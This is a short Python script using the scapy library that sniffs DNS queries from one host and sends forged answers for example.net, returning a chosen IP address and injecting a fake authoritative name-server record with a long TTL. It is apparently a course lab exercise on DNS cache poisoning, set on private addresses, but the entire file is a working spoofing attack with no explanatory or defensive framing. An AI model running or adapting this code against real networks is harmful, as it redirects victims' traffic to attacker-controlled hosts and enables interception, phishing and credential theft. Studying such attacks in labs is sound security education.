from scapy.all import *

def spoof_dns(pkt):
  if 'DNS' in pkt and 'example.net' in str(pkt['DNS'].qd.qname):
     IPpkt = IP(dst=pkt['IP'].src, src=pkt['IP'].dst)
     UDPpkt = UDP(dport=pkt['UDP'].sport, sport=53)

     Anssec = DNSRR(rrname=pkt['DNS'].qd.qname, type='A', rdata='10.0.0.24', ttl=259200)
     NSsec  = DNSRR(rrname="example.net", type='NS', rdata='ns1.cmpt783.org', ttl=259200)
     DNSpkt = DNS(id=pkt['DNS'].id, qd=pkt['DNS'].qd, aa=1, rd=0, qdcount=1, qr=1, ancount=1, nscount=1, an=Anssec, ns=NSsec)

     spoofpkt = IPpkt/UDPpkt/DNSpkt
     send(spoofpkt)

pkt = sniff(filter='udp and (src host 192.168.56.11 and dst port 53)', iface="enp0s8", prn=spoof_dns)
